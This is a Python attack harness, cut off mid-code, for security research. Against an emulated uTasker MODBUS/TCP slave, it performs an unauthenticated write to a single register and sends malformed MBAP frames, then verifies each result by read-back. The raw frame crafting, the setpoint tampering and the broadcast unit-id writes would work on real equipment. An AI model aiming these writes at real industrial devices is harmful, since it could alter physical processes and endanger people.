# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Unauthenticated MODBUS/TCP write against the uTasker slave's register map.

WHAT THIS DRIVES (the real seam, cited).  The rehosted firmware is a **MODBUS/TCP
slave on port 502** (the port is `f6 01` inside `cMODBUS_default` at flash
0x08015540) reached over its own network stack. Its request path is
``fnMODBUSListener`` (0x08012738) -> ``fnHandleMODBUS_input`` (0x08011b60) ->
``fnSendMODBUS_response`` (0x0801262a). Probing it with ``modbus.Session``
recovered the slave's holding-register map: **registers 2..6 exist**; 0, 1 and >=7
answer exception 0x02 (ILLEGAL DATA ADDRESS).

**The vulnerability.**  MODBUS/TCP has no authentication, no authorisation and no
integrity protection — it is the defining weakness of the protocol as deployed.
Anything that can reach :502 can issue a **function code 6 (write single
register)** against this slave's live register map. The firmware does not ask who
is calling, does not distinguish an engineering workstation from an attacker, and
keeps no record that the value was written rather than measured.

**The attack.**  Open a session and write a chosen value into a live holding
register, then read it back through the same session. This is the same class of
unauthenticated-write as the classic ICS setpoint-tampering case: the value the
slave subsequently serves to every other master is the attacker's.

**BEFORE / AFTER.**  ``ModbusWriteAttack.arm()`` reads the register, writes the
payload, and reads it back — all three through the firmware's own MODBUS engine.
The honest boolean is ``landed``: the registers here are **live** (their low bits
track device state and drift between reads), so ``landed`` requires the read-back's
**high byte** to equal the high byte written, which a drifting low nibble cannot
fake. The raw before/after/read-back values are all reported so the check is
auditable rather than trusted.

SCOPE / ETHICS.  This drives a rehosted, publicly-published demo firmware inside an
emulator on the operator's own machine. It is a defensive demonstration of why
MODBUS/TCP needs a segmented network and an authenticating gateway in front of it,
not a technique for interfering with deployed equipment.

Usage:
    python -m rehostry_utasker_modbus.attack     # scripted demo, JSON to stdout
    rehostry-utasker-modbus attack               # same, via the CLI
"""
from __future__ import annotations

import json
import os
import random
import struct
import secrets
import shutil
import signal
import subprocess
import tempfile
import time
from typing import Any, Callable, Dict, List, Optional

from . import modbus, paths, spawn

# The slave's live holding registers, as probed (0/1 and >=7 are out of range).
VALID_REGISTERS = (2, 3, 4, 5, 6)
TARGET_REGISTER = 2
ATTACK_VALUE = 0x1234


class ModbusWriteAttack:
    """Unauthenticated FC06 write into the slave's holding-register map."""

    def __init__(self, sport: int = 50400) -> None:
        self.sport = sport
        self.session: Optional[modbus.Session] = None

    # ---- session ------------------------------------------------------
    def connect(self) -> bool:
        s = modbus.Session(sport=self.sport)
        if not s.resolve() or not s.connect():
            return False
        self.session = s
        return True

    def read_map(self) -> dict:
        """The slave's register map as it serves it right now."""
        out = {}
        if self.session is None or SEAM_CONTROL:
            return out
        for a in VALID_REGISTERS:
            r = self.session.read_holding(a, 1)
            out[a] = modbus.reg_value(r)
        return out

    # ---- the attack ---------------------------------------------------
    def arm(self, reg: int = TARGET_REGISTER, value: int = ATTACK_VALUE) -> dict:
        """Write `value` into `reg` with no credentials, and verify by read-back."""
        if self.session is None and not self.connect():
            return {"reg": reg, "value": value, "landed": False,
                    "note": "could not open a MODBUS session to the firmware "
                            "(is the rehost running with the eth bridge?)"}
        if SEAM_CONTROL:
            return {"reg": reg, "value": value, "landed": False,
                    "before": None, "write_acknowledged": False,
                    "after": None, "after_hex": None,
                    "note": "HAL_SEAM_CONTROL=1: the session was opened but no "
                            "MODBUS PDU was sent, so the slave's engine never "
                            "answered"}
        s = self.session
        before = modbus.reg_value(s.read_holding(reg, 1))
        ack = s.write_single(reg, value)
        wrote = bool(ack and not (ack[0] & 0x80))
        after = modbus.reg_value(s.read_holding(reg, 1))
        # These registers are live: the low bits drift between reads, so compare
        # the high byte, which device state does not move.
        landed = (wrote and after is not None
                  and (after >> 8) == ((value >> 8) & 0xFF))
        return {
            "reg": reg,
            "value": value,
            "value_hex": "0x%04x" % value,
            "before": before,
            "write_acknowledged": wrote,
            "after": after,
            "after_hex": None if after is None else "0x%04x" % after,
            "authentication_required": False,
            # REAL iff the slave now serves the attacker's value
            "landed": landed,
        }

    def restore(self, reg: int, value: Optional[int]) -> dict:
        """Put back a previously-read value (best effort; the low bits are live)."""
        if self.session is None or value is None:
            return {"restored": False}
        ack = self.session.write_single(reg, value)
        return {"restored": bool(ack and not (ack[0] & 0x80)),
                "value": value,
                "after": modbus.reg_value(self.session.read_holding(reg, 1))}


def run_modbus_write_demo(on_stage: Optional[Callable] = None,
                          reg: int = TARGET_REGISTER,
                          value: int = ATTACK_VALUE) -> dict:
    """Scripted seam: open a session, show the register map, write a register
    without credentials, verify by read-back, then put the old value back.
    Requires a separately-running rehost with the eth bridge (boot it via
    ``rehostry-utasker-modbus-panel`` or spawn.py's
    ``spawn_argv(overlays=[paths.ETH_BRIDGE_OVERLAY])``). ``run_attack`` below
    self-boots the same recipe."""
    def stage(name, **d):
        if on_stage:
            on_stage(name, **d)

    atk = ModbusWriteAttack()
    if not atk.connect():
        stage("error", note="no MODBUS session -- is the rehost running?")
        return {"error": True}
    stage("connect", note="MODBUS/TCP session up to %s:%d (no credentials were "
                          "offered or requested)" % (modbus.FW_IP, modbus.MODBUS_PORT))

    before_map = atk.read_map()
    stage("read", result=before_map,
          note="holding registers %s = %s" % (list(VALID_REGISTERS),
                                              list(before_map.values())))

    res = atk.arm(reg, value)
    stage("attack", result=res,
          note="FC06 wrote 0x%04x to register %d -> read-back %s; landed=%s"
               % (value, reg, res.get("after_hex"), res.get("landed")))

    rest = atk.restore(reg, before_map.get(reg))
    stage("restore", result=rest, note="wrote the previous value back")
    return {"map": before_map, "attack": res, "restore": rest}


# ---------------------------------------------------------------------------
# Self-booting entry point (fleet attack-interface contract, playbook §2a).
#
# `run_attack` spawns its OWN rehost (the same recipe the panel uses:
# spawn.py + the eth_bridge overlay), waits for the firmware's MODBUS listener to
# come up on its own network stack, runs the unauthenticated FC06 write, verifies
# by read-back through the firmware's own MODBUS engine, and tears down ONLY the
# PID it started. The oracle is unchanged -- `landed` still comes from
# `ModbusWriteAttack.arm()` (the read-back's high byte must equal the byte
# written, which the live low nibble cannot fake).
# ---------------------------------------------------------------------------

# The firmware needs its ARP/ETH bring-up to finish before the first connect
# (see utasker_panel.modbus_connect); connecting the instant the listener answers
# yields a fragile session. Overridable for a slow host.
#: Falsification knob for the census seam.  With ``HAL_SEAM_CONTROL=1`` the TCP
#: session is still opened but no MODBUS PDU is ever sent, so the firmware's own
#: MODBUS engine never answers and ``modbus_round_trip`` -- and therefore
#: ``landed`` -- must come out false.  A seam boolean that no control can move
#: is not evidence.
SEAM_CONTROL = os.environ.get("HAL_SEAM_CONTROL") == "1"

WARMUP_S = float(os.environ.get("UTASKER_WARMUP_S", "25"))
# How long to keep retrying the MODBUS handshake after the warm-up.
CONNECT_DEADLINE_S = float(os.environ.get("UTASKER_CONNECT_DEADLINE_S", "150"))


def _private_spool() -> str:
    """A fresh, unguessable bridge spool for THIS spawn, and point the client at it.

    ⛔ THIS IS THE ATTACK'S IDENTITY CHALLENGE, and it has to be, because this
    device has no bridge socket: the rendezvous with the guest is a spool
    DIRECTORY that ``bp_handlers/eth_bridge.py`` services. The old code used the
    fixed shared path ``/tmp/rehostry_utasker_eth`` for every run, which is the
    same defect as grading whatever answers on a well-known port:

      * an orphaned emulator from an earlier run (or a panel booted alongside)
        keeps servicing that directory, so the client can get a full ARP -> SYN
        -> MODBUS round trip out of a guest THIS ATTACK NEVER STARTED, and
      * ``rmtree`` on a shared path also stamps on a concurrent session's spool.

    A per-spawn random directory closes both: the emulator this attack starts is
    told the path via ``HAL_UT_ETH_SPOOL`` and no other process can guess it, so
    every frame the oracle reads provably came from the child we spawned (whose
    liveness and bridge-installation line we also check -- see ``_verify_child``).
    """
    path = os.path.join(tempfile.gettempdir(),
                        "rehostry_utasker_eth-%s" % secrets.token_hex(8))
    shutil.rmtree(path, ignore_errors=True)
    os.makedirs(os.path.join(path, "to_fw"), exist_ok=True)
    return modbus.set_spool(path)


def _verify_child(proc: Optional[subprocess.Popen], log_path: str,
                  spool: str) -> Dict[str, Any]:
    """Provenance: the peer must be the emulator THIS process spawned.

    Three independent facts, all of which must hold, and all of which are
    returned so the verdict can be audited rather than trusted:
      * ``spawned`` -- we have a child process object at all;
      * ``bridge_bound`` -- that child's own log announces the eth bridge
        installed **on our private spool path** (the analogue of the fleet's
        "abort unless the child's log shows a successful bind");
      * ``alive`` -- it was still running when the oracle ran, so the frames we
        graded were not the residue of something else.
    """
    out: Dict[str, Any] = {"spawned": proc is not None,
                           "pid": None if proc is None else proc.pid,
                           "spool": spool, "bridge_bound": False,
                           "alive": proc is not None and proc.poll() is None}
    try:
        with open(log_path, "r", errors="replace") as fh:
            blob = fh.read()
        out["bridge_bound"] = ("eth_bridge: installed" in blob
                               and ("spool=%s" % spool) in blob)
    except OSError:
        pass
    out["ok"] = bool(out["spawned"] and out["bridge_bound"] and out["alive"])
    return out


def _shutdown(proc: Optional[subprocess.Popen], logf) -> None:
    """Tear down ONLY the rehost we spawned (its own process group). Never a
    global pkill -- other sessions run emulators on this machine (playbook §2.10)."""
    if proc is not None and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except (ProcessLookupError, OSError):
            pass
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except (ProcessLookupError, OSError):
                pass
    if logf is not None:
        try:
            logf.close()
        except OSError:
            pass


def _wait_for_session(proc: subprocess.Popen, sport: int
                      ) -> Optional[ModbusWriteAttack]:
    """Wait for the firmware's own MODBUS/TCP listener, then hold one session.

    Mirrors utasker_panel.modbus_connect: let the stack settle (WARMUP_S), then
    retry the ARP+SYN handshake until the slave answers or the deadline passes.
    One ModbusWriteAttack object is reused across retries (each .connect() opens a
    fresh TCP session), matching the proven panel behaviour."""
    time.sleep(WARMUP_S)
    atk = ModbusWriteAttack(sport=sport)
    deadline = time.time() + CONNECT_DEADLINE_S
    while time.time() < deadline:
        if proc.poll() is not None:
            return None                       # emulator died -- stop waiting
        modbus.drain_inbox()                  # bridge replays queued frames; drop stale
        if atk.connect():
            return atk
        time.sleep(2.0)
    return None


# ---------------------------------------------------------------- M6 / M7 --
#: Register 6 is the ONLY holding register whose value stays put: 2..5 are the
#: firmware's own live demo channels and ramp on their own (see `run_m6`).  So
#: 6 is what an attacker-controlled state witness has to be built on, and 2..5
#: are what proves the guest is running its own state machine between reads.
STABLE_REGISTER = 6
RAMPING_REGISTERS = (2, 3, 4, 5)
M6_ROUNDS = 3

#: How this device is addressed on the wire, so a malformed MBAP header can be
#: built by hand.  MBAP = transaction id, protocol id (MUST be 0x0000 --
#: "MODBUS Messaging on TCP/IP Implementation Guide" v1.0b §4.1), length, unit.
MBAP = ">HHHB"
UNIT = 1


def _raw_request(sess, pdu: bytes, txn: int = None, proto: int = 0,
                 length: int = None, unit: int = UNIT,
                 timeout: float = 6.0) -> Optional[bytes]:
    """One MODBUS/TCP exchange with FULL control of the MBAP header.

    ``modbus.Session.request`` always builds a well-formed header, so it cannot
    express the three MBAP-level adversarial classes below.  This is the same
    send/ack path, with the header supplied by the caller.
    """
    sess.txn = (sess.txn + 1) & 0xFFFF
    hdr = struct.pack(MBAP, sess.txn if txn is None else txn, proto,
                      len(pdu) + 1 if length is None else length, unit)
    modbus.send(modbus.tcp(sess.mac, modbus.MODBUS_PORT, sess.sport,
                           sess.seq, sess.ack, 0x18, hdr + pdu))
    sess.seq = (sess.seq + len(hdr) + len(pdu)) & 0xFFFFFFFF
    for f in sess.rx.read(timeout):
        p = modbus.parse_tcp(f)
        if p and p[0] == modbus.MODBUS_PORT and p[5]:
            sess.ack = (p[2] + len(p[5])) & 0xFFFFFFFF
            modbus.send(modbus.tcp(sess.mac, modbus.MODBUS_PORT, sess.sport,
                                   sess.seq, sess.ack, 0x10))
            return p[5][7:] if len(p[5]) > 7 else b""
    return None


def _exception_code(resp: Optional[bytes]) -> Optional[int]:
    """The exception code out of a MODBUS error response, or None if the reply
    was not one.  `None` also covers silence, and the two are kept apart by the
    caller: a seam that has gone deaf must never read as a rejection."""
    if not resp or len(resp) < 2 or not (resp[0] & 0x80):
        return None
    return resp[1]


def _regs(sess, addr: int, count: int) -> Optional[List[int]]:
    """An FC03 read decoded into a list, or None if it was not answered with a
    well-formed FC03 response of exactly the requested length."""
    r = sess.read_holding(addr, count)
    if not r or r[0] != 3 or len(r) < 2 or r[1] != 2 * count \
            or len(r) < 2 + 2 * count:
        return None
    return list(struct.unpack(">%dH" % count, r[2:2 + 2 * count]))


def run_m6(sess, image: bytes, rng, stage: Callable,
           rounds: int = M6_ROUNDS, freeze: bool = False) -> Dict[str, Any]:
    """M6 -- the same input at two different states, two different correct outputs.

    Three rounds.  Each reads state A with two **bare queries that carry no
    value of their own** (`FC03 6,1` and `FC03 2,5`), moves the state, and reads
    state B with the same two.  Three witnesses, each of a different kind:

    * **the attacker's own value** -- register 6 is the one register whose value
      stays put, so `FC03 6,1` must differ between the reads and must equal the
      fresh 16-bit value this round drew from the run's RNG;
    * **the guest's own clock** -- registers 2..5 are uTasker's live demo
      channels and ramp with the firmware's own execution, so register 4 must
      have ADVANCED between the two reads.  Register 4 is written by no phase
      of this run, so the movement is the firmware's own and not an after-effect
      of our traffic;
    * **an invariant the firmware maintains between two of its own registers**
      -- `reg5 == -reg4` mod 2**16, at BOTH reads.  No request carries either
      side of that relation, and a replayed or fabricated register block does
      not satisfy it while also ramping.  (The %2/%3 pair holds the same
      relation on an untouched boot and does NOT hold here, because the M4
      phase writes register 2 earlier in the same run -- asserting it was my
      error and three rounds failed on it before it was corrected.)

    ``freeze`` is the rung-specific falsification knob.  It sends the
    state-changing FC06 with **MBAP protocol id 0x0001** instead of the
    mandatory 0x0000, so **the firmware's own stack** refuses it (this build
    answers exception 0x0A and echoes the bad protocol id back) and the state
    never moves.  The two bare read-backs are untouched and the predicate is
    unchanged, so the arm is scored by exactly the predicate under test
    (playbook w33.1).
    """
    out: Dict[str, Any] = {"rounds": rounds, "freeze": freeze, "results": []}
    passed = 0
    for r in range(rounds):
        stable_a = _regs(sess, STABLE_REGISTER, 1)
        block_a = _regs(sess, RAMPING_REGISTERS[0], 5)

        want = rng.getrandbits(16)
        pdu = struct.pack(">BHH", 6, STABLE_REGISTER, want)
        echo = _raw_request(sess, pdu, proto=1 if freeze else 0)

        stable_b = _regs(sess, STABLE_REGISTER, 1)
        block_b = _regs(sess, RAMPING_REGISTERS[0], 5)

        def paired(block):
            # ⚠ ONLY the %4/%5 pair. My first cut asserted `reg3 == -reg2` too
            # and it FAILED 3/3 rounds -- correctly. The M4 phase earlier in
            # this same run does an FC06 write into register 2, which desyncs
            # that pair permanently; registers 4 and 5 are never written by any
            # phase and stay paired. The invariant was real, my statement of it
            # was wrong, and the run said so rather than the check being
            # loosened to fit (playbook: verify the model before you retire --
            # or here, before you trust -- the suspect).
            return (block is not None
                    and block[3] == ((0x10000 - block[2]) & 0xFFFF))

        terms = {
            "stable_register_differs": (stable_a is not None
                                        and stable_b is not None
                                        and stable_a[0] != stable_b[0]),
            "stable_register_is_the_commanded_value": (stable_b is not None
                                                       and stable_b[0] == want),
            # The guest's own state machine moved between the two reads,
            # measured on register 4 -- which NO phase of this run ever writes,
            # so the movement is the firmware's and not an after-effect of our
            # own traffic.
            "ramp_advanced": (block_a is not None and block_b is not None
                              and block_a[2] != block_b[2]),
            # A relation the FIRMWARE maintains, which no request carries.
            "firmware_invariant_holds_before": paired(block_a),
            "firmware_invariant_holds_after": paired(block_b),
            "reply_absent_from_image": (
                stable_b is not None
                and struct.pack(">BBH", 3, 2, stable_b[0]) not in image),
        }
        ok = all(terms.values())
        passed += 1 if ok else 0
        row = {"round": r, "commanded": "0x%04X" % want,
               "stable_a": None if stable_a is None else "0x%04X" % stable_a[0],
               "stable_b": None if stable_b is None else "0x%04X" % stable_b[0],
               "block_a": block_a, "block_b": block_b,
               "write_echo": echo.hex() if echo else None,
               "write_exception": _exception_code(echo),
               "terms": terms, "passed": ok}
        out["results"].append(row)
        stage("m6_round", result=row,
              note="round %d: reg6 %s -> %s (commanded %s) | reg2 %s -> %s | "
                   "passed=%s"
                   % (r, row["stable_a"], row["stable_b"], row["commanded"],
                      None if block_a is None else block_a[0],
                      None if block_b is None else block_b[0], ok))

    out["passed"] = passed
    out["ok"] = bool(rounds > 0 and passed == rounds)
    return out


#: M7's classes.  Seven of the eight predict an exception code straight out of
#: the **MODBUS Application Protocol Specification v1.1b** exception table
#: (01 ILLEGAL FUNCTION, 02 ILLEGAL DATA ADDRESS, 03 ILLEGAL DATA VALUE) and
#: the **Messaging on TCP/IP Implementation Guide v1.0b** (protocol id MUST be
#: 0x0000, and the length field counts unit id + PDU) -- upstream sources, not
#: this rehost and not anything we implemented, which is what Rule 1 asks of an
#: oracle's source.  `mbap_protocol_id_nonzero` is the one exception and is
#: labelled as such: the spec says only that such a frame must not be executed,
#: while the code this build answers with (0x0A) was RECOVERED from the
#: firmware by probing and is therefore a regression check, not a prediction.
def m7_classes(rng) -> List[Dict[str, Any]]:
    live = rng.getrandbits(16)
    twinv = rng.getrandbits(16)
    return [
        {"name": "illegal_function", "code": 0x01, "source": "modbus-spec",
         "pdu": struct.pack(">BHH", 0x41, 0, 1),
         "twin": struct.pack(">BHH", 0x03, STABLE_REGISTER, 1),
         "spec": "MODBUS v1.1b exception 01 ILLEGAL FUNCTION -- 0x41 is in the "
                 "user-defined range and this slave implements FC 3/6/8 only"},
        {"name": "illegal_read_address", "code": 0x02, "source": "modbus-spec",
         "pdu": struct.pack(">BHH", 3, 7, 1),
         "twin": struct.pack(">BHH", 3, STABLE_REGISTER, 1),
         "spec": "MODBUS v1.1b exception 02 ILLEGAL DATA ADDRESS -- this "
                 "slave's map is registers 2..6, so 7 is one past the end"},
        {"name": "illegal_write_address", "code": 0x02, "source": "modbus-spec",
         "pdu": struct.pack(">BHH", 6, 0, live),
         "twin": struct.pack(">BHH", 6, STABLE_REGISTER, twinv),
         "spec": "MODBUS v1.1b exception 02 -- register 0 is below the map; "
                 "the twin writes the SAME shape to a register that exists, so "
                 "the twin arm moves the state witness as well as answering"},
        {"name": "zero_quantity", "code": 0x03, "source": "modbus-spec",
         "pdu": struct.pack(">BHH", 3, 2, 0),
         "twin": struct.pack(">BHH", 3, 2, 1),
         "spec": "MODBUS v1.1b: FC03 quantity must be 1..125, so 0 is "
                 "exception 03 ILLEGAL DATA VALUE"},
        {"name": "quantity_over_125", "code": 0x03, "source": "modbus-spec",
         "pdu": struct.pack(">BHH", 3, 2, 126),
         "twin": struct.pack(">BHH", 3, 2, 5),
         "spec": "MODBUS v1.1b: 126 exceeds the 125-register maximum"},
        {"name": "truncated_pdu", "code": 0x02, "source": "modbus-spec",
         "pdu": b"\x03\x00",
         "twin": struct.pack(">BHH", 3, STABLE_REGISTER, 1),
         "spec": "a two-byte FC03 PDU cannot carry an address and a quantity"},
        {"name": "mbap_length_short", "code": 0x03, "source": "modbus-spec",
         "pdu": struct.pack(">BHH", 6, STABLE_REGISTER, live),
         "twin": struct.pack(">BHH", 6, STABLE_REGISTER, twinv),
         "mbap_length": 2,
         "spec": "TCP/IP guide v1.0b: the MBAP length field counts unit id + "
                 "PDU, so 2 contradicts the six bytes that follow"},
        {"name": "mbap_protocol_id_nonzero", "code": 0x0A,
         "source": "firmware-recovered",
         "pdu": struct.pack(">BHH", 6, STABLE_REGISTER, live),
         "twin": struct.pack(">BHH", 6, STABLE_REGISTER, twinv),
         "mbap_proto": 1,
         "spec": "TCP/IP guide v1.0b §4.1: protocol id MUST be 0x0000, so this "
                 "frame must not be executed. The spec does not say WHICH "
                 "answer; 0x0A (GATEWAY PATH UNAVAILABLE) is what THIS build "
                 "chooses and was recovered by probing -- a regression check, "
                 "not a prediction"},
    ]


def run_m7(sess, stage: Callable, rng, wellformed: bool = False
           ) -> Dict[str, Any]:
    """M7 -- adversarial input handled as the device would, known-good after.

    One predicate, applied identically to both arms (playbook w33.1):

        the reply is an exception carrying the predicted code, AND the state
        witness (register 6) is unchanged, AND a bare FC03 answers afterwards.

    Under ``--m7-wellformed`` each class's well-formed twin is sent instead.
    Every twin draws an ordinary FC03/FC06 response rather than an exception,
    and the three write-shaped twins also MOVE register 6, so the phase scores
    0 of N -- which is at once this rung's control and the proof that the
    exceptions in the live arm were the firmware discriminating rather than a
    seam that refuses everything.
    """
    out: Dict[str, Any] = {"wellformed_twin_arm": wellformed, "results": []}
    classes = m7_classes(rng)
    passed = 0
    for cls in classes:
        before = _regs(sess, STABLE_REGISTER, 1)
        pdu = cls["twin"] if wellformed else cls["pdu"]
        kwargs = {}
        if not wellformed:
            if "mbap_proto" in cls:
                kwargs["proto"] = cls["mbap_proto"]
            if "mbap_length" in cls:
                kwargs["length"] = cls["mbap_length"]
        resp = _raw_request(sess, pdu, **kwargs)
        after = _regs(sess, STABLE_REGISTER, 1)
        code = _exception_code(resp)
        terms = {
            "exception_code_is_the_predicted_one": code == cls["code"],
            "state_unchanged": (before is not None and after is not None
                                and before[0] == after[0]),
            "console_alive_after": after is not None,
            # Silence is NOT a rejection on this device -- it answers
            # exceptions -- so a missing reply is its own outcome and is never
            # folded into "refused" (playbook w29.2/w30.4).
            "answered_at_all": resp is not None,
        }
        ok = all(terms.values())
        passed += 1 if ok else 0
        row = {"name": cls["name"], "arm": "twin" if wellformed else "malformed",
               "sent": pdu.hex(), "mbap_proto": cls.get("mbap_proto", 0),
               "mbap_length": cls.get("mbap_length"),
               "predicted_code": cls["code"], "source": cls["source"],
               "observed_code": code, "reply": resp.hex() if resp else None,
               "reg6_before": None if before is None else "0x%04X" % before[0],
               "reg6_after": None if after is None else "0x%04X" % after[0],
               "spec": cls["spec"], "terms": terms, "passed": ok}
        out["results"].append(row)
        stage("m7_class", result=row,
              note="%-26s -> %s (predicted exception 0x%02X, %s) reg6 %s -> %s "
                   "passed=%s"
                   % (cls["name"],
                      ("exception 0x%02X" % code) if code is not None
                      else (resp.hex() if resp else "<silence>"),
                      cls["code"], cls["source"], row["reg6_before"],
                      row["reg6_after"], ok))

    # THE DISCRIMINATOR, and it is not a liveness poll.  `unit id 0` is MODBUS's
    # broadcast address and differs from an accepted write in ONE byte: this
    # firmware answers NOTHING and still APPLIES the write.  So one frame draws
    # silence AND changes the guest's state, which rules out both "the seam is
    # dead" and "the parser drops everything" at once -- §1a evidence form 3.
    bval = rng.getrandbits(16)
    b_before = _regs(sess, STABLE_REGISTER, 1)
    bresp = _raw_request(sess, struct.pack(">BHH", 6, STABLE_REGISTER, bval),
                         unit=0, timeout=4.0)
    b_after = _regs(sess, STABLE_REGISTER, 1)
    out["broadcast_discriminator"] = {
        "value_written": "0x%04X" % bval, "silent": bresp is None,
        "reg6_before": None if b_before is None else "0x%04X" % b_before[0],
        "reg6_after": None if b_after is None else "0x%04X" % b_after[0],
        "applied": b_after is not None and b_after[0] == bval,
    }
    stage("m7_broadcast_discriminator",
          result=out["broadcast_discriminator"],
          note="unit id 0 (broadcast) FC06 reg6=0x%04X -> %s, reg6 %s -> %s"
               % (bval, "SILENCE" if bresp is None else bresp.hex(),
                  out["broadcast_discriminator"]["reg6_before"],
                  out["broadcast_discriminator"]["reg6_after"]))

    # "...and known-good traffic still works afterwards" -- M7's own second half.
    kg = rng.getrandbits(16)
    kg_echo = _raw_request(sess, struct.pack(">BHH", 6, STABLE_REGISTER, kg))
    kg_read = _regs(sess, STABLE_REGISTER, 1)
    kg_block = _regs(sess, RAMPING_REGISTERS[0], 5)
    known_good = bool(kg_echo == struct.pack(">BHH", 6, STABLE_REGISTER, kg)
                      and kg_read is not None and kg_read[0] == kg
                      and kg_block is not None)
    out["known_good_after"] = known_good
    out["known_good_detail"] = {"wrote": "0x%04X" % kg,
                                "echo": kg_echo.hex() if kg_echo else None,
                                "read_back": kg_read, "block": kg_block}
    stage("m7_known_good_after",
          note="wrote 0x%04X -> echo %s, read-back %s, block %s -> ok=%s"
               % (kg, kg_echo.hex() if kg_echo else None, kg_read, kg_block,
                  known_good))

    out["classes"] = len(classes)
    out["passed"] = passed
    out["distinct_codes"] = len({c["code"] for c in classes})
    out["spec_predicted_classes"] = sum(1 for c in classes
                                        if c["source"] == "modbus-spec")
    out["ok"] = bool(passed == len(classes) and known_good
                     and out["broadcast_discriminator"]["silent"]
                     and out["broadcast_discriminator"]["applied"])
    return out


#: M5 and M8 are each DEFINED and UNMET at 1 of 4 on this rehost.
#:
#: ⚠ This string said "UNDEFINED: one link, one application service" until
#: 2026-09-08.  That reading was refuted by the firmware's OWN serial
#: configuration menu, which is verbatim in `uTaskerMODBUS.bin` at 0x109cc --
#: *"Terminal menu login. FTP server. WEB server. WEB server authentication.
#: TELNET server. Telnet port"* -- plus `set_telnet` at 0x15e88.  RULES Rule 1
#: names *"the firmware's own published menu"* as a valid inventory source, and
#: that menu does not shrink when this rehost implements less.  Four declared
#: services: MODBUS/TCP :502 (graded, at M4), FTP, WEB and TELNET.  M5 and M8
#: take DIFFERENT denominators (RULES §1b) and were computed separately; they
#: agree at 4 here, which is a coincidence of this image and not one number
#: serving both rungs.  See STATUS.md's *M5/M8 INTERFACE INVENTORY* section and
#: `scratch-batch-s0907/M5-M8-INVENTORY-AUDIT.md`.
#:
#: ⭐ The header was corrected on 2026-09-08 and this constant was NOT, so for
#: one day every live run printed `UNDEFINED` while `STATUS.md` line 1 said
#: `DEFINED-and-UNMET-at-1-of-4`.  A header corrected without its code is a
#: correction no run reproduces (playbook w120.6).  `tests/test_m5_m8_status.py`
#: now couples the two so the pair cannot drift again.
#:
#: The ARP/ICMP and TCP-handshake disposal is UNCHANGED and still correct: they
#: are stack-level reflexes and SUBSTRATE by the 2026-09-02 ruling, however
#: genuinely the guest computes them.  So is the 2026-09-02 ruling that M6/M7
#: do not require M5, which is what makes those rungs claimable here.
#:
#: ⚠ This is BOOKKEEPING, not a rung.  `_extend_milestone` never reads this
#: string, and no milestone moves when it changes.
M5_M8_STATUS = ("DEFINED and UNMET at 1 of 4: the firmware's own serial "
                "configuration menu (verbatim in uTaskerMODBUS.bin at 0x109cc, "
                "plus set_telnet at 0x15e88) declares FOUR services -- "
                "MODBUS/TCP :502 (graded, at M4), FTP server, WEB server, "
                "TELNET server. RULES Rule 1 names the firmware's own published "
                "menu as a valid inventory source. M5 and M8 take different "
                "denominators (RULES §1b) and were computed separately; both "
                "come to 1 of 4. ARP and the TCP handshake remain SUBSTRATE, "
                "not a second interface (RULES §1a, 2026-09-02) -- that "
                "disposal stands. M6/M7 do not require M5 (same ruling).")


def _extend_milestone(result: Dict[str, Any]) -> Dict[str, Any]:
    """Raise the milestone to M6/M7 when this run measured them.

    Each is graded **off M4, never off the other**: a scorer that chains
    M7 <- M6 is a defect in the scorer, not a property of the ladder (RULES
    §1a, 2026-09-02), and this device's `--m6-freeze` arm demonstrates it.

    A harness fault blanks the milestone entirely, so a run that could not
    measure credits no rung at all -- including the M4 it may already have had.
    "Could not measure" must never share a value with "measured and it was bad"
    (playbook w29.2/w37.3).
    """
    result["m5_m8_status"] = M5_M8_STATUS
    m6 = bool(result.get("m6_stateful"))
    m7 = bool(result.get("m7_adversarial_tolerated"))
    result["m6_stateful"] = m6
    result["m7_adversarial_tolerated"] = m7
    if result.get("harness_fault"):
        result["milestone"] = None
        result["landed"] = False
        return result
    if result.get("milestone") == "M4" and result.get("landed"):
        if m7:
            result["milestone"] = "M7"
        elif m6:
            result["milestone"] = "M6"
    return result


def run_attack(on_stage: Optional[Callable] = None,
               log_dir: Optional[str] = None,
               reg: int = TARGET_REGISTER,
               value: int = ATTACK_VALUE,
               emulator: str = "unicorn",
               ladder: bool = True,
               m6_freeze: bool = False,
               m7_wellformed: bool = False) -> Dict[str, Any]:
    """Boot the uTasker MODBUS slave, run the unauthenticated FC06 write, and
    verify from the firmware's OWN output. Self-booting: spawns its own rehost and
    tears it down. Returns a dict with at least {"booted", "landed"}."""
    def stage(name: str, **d: Any) -> None:
        if on_stage:
            on_stage(name, **d)

    # ⚠ THE SEEDED RUNG WAS A CONSTANT ABOVE M0, AND A DEAD ARM PROVED IT.
    # This dict is returned verbatim on the failure paths below, and it was
    # seeded `"milestone": "M1"` -- a CONSTANT, so a run in which nothing
    # executed still claimed the rung "boots without faulting". Measured
    # 2026-09-05 with `uTaskerMODBUS.bin` moved off disk (restored byte-identical,
    # sha256 dc28f428...): the RESULT line read
    #   booted:false landed:false milestone:"M1"
    # which the fleet guard scores WALL-M1 and the census counts as an M1
    # device. The contradicting `booted: False` was in the same dict.
    # M0 is the only rung a run with no firmware has earned. Every rung above
    # it is still assigned from evidence further down, so the LIVE arm is
    # unchanged.
    result: Dict[str, Any] = {"booted": False, "landed": False,
                              "milestone": "M0", "modbus_round_trip": False,
                              "seam_control": SEAM_CONTROL}

    if not paths.firmware_present():
        stage("error", note="firmware not extracted at %s -- run "
                            "tools/extract_firmware.py first (see PROVENANCE.md)"
                            % paths.firmware_bin())
        return _extend_milestone(result)

    ld = log_dir or os.environ.get("TMPDIR", "/tmp")
    os.makedirs(ld, exist_ok=True)
    log_path = os.path.join(ld, "utasker_modbus_attack.log")

    spool = _private_spool()
    result["spool"] = spool
    proc: Optional[subprocess.Popen] = None
    logf = None
    sport = 50400
    try:
        argv = spawn.spawn_argv(emulator=emulator,
                                overlays=[paths.ETH_BRIDGE_OVERLAY])
        env = spawn.spawn_env(extra={"HAL_ION_QUIET": "1",
                                     "HAL_UT_ETH_SPOOL": spool})
        logf = open(log_path, "w")
        stage("boot",
              note="booting uTasker MODBUS/TCP slave (STM32F4, ARMv7E-M) + eth "
                   "bridge; ~%ds to the MODBUS listener" % int(WARMUP_S),
              log=log_path)
        proc = subprocess.Popen(argv, cwd=spawn.spawn_cwd(), env=env,
